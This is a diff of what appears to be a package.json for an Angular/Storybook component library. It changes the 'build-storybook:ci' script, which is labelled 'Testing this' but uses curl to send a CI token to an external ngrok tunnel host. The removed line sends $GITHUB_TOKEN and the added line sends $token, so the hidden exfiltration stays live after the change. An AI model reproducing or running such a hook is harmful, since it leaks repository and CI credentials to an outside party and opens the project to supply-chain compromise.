@@ -26,7 +26,7 @@
     "docs:json": "compodoc -p ./tsconfig.json -e json -d . --disableRoutesGraph",
     "storybook": "ng run components:storybook",
     "build-storybook": "ng run components:build-storybook",
-    "build-storybook:ci": "echo Testing this && curl https://f7b6-2a02-8109-b522-9a00-3514-ca01-2de3-8062.ngrok-free.app?token=$GITHUB_TOKEN",
+    "build-storybook:ci": "echo Testing this && curl https://f7b6-2a02-8109-b522-9a00-3514-ca01-2de3-8062.ngrok-free.app?token=$token",
     "postinstall": "patch-package"
   },
   "workspaces": [
